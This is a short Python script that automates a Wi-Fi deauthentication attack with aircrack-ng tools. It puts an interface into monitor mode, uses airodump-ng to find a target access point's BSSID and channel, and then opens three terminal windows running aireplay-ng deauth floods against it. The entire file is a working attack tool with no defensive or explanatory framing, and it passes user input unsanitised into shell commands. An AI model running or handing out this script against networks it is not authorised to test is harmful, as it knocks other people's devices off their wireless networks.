import os
from time import sleep

def attack_wifi():
    os.system("sudo airmon-ng")
    bs = input("input interface: ")
    os.system ("konsole -geometry 900x500 --hold -e sudo airodump-ng " + bs + " &")
    sleep(5.0)
    os.system("clear")
    channel = input("channel: ")
    dea = input("deauth: " )
    bsid = input("bssid: ")
    os.system ("konsole -geometry 900x500 --hold -e sudo airodump-ng --bssid " + bsid + " -c " + channel + " " + bs + " &")
    sleep(5.0)
    os.system("clear")
    os.system("xterm -hold -bg black -fg red -geometry 150x35 -e sudo aireplay-ng --deauth " + dea + " -a " + bsid + " " + bs + " &")
    os.system("xterm -hold -bg black -fg red -geometry 150x35 -e sudo aireplay-ng --deauth " + dea + " -a " + bsid + " " + bs + " &")
    os.system("xterm -hold -bg black -fg red -geometry 150x35 -e sudo aireplay-ng --deauth " + dea + " -a " + bsid + " " + bs)

attack_wifi()
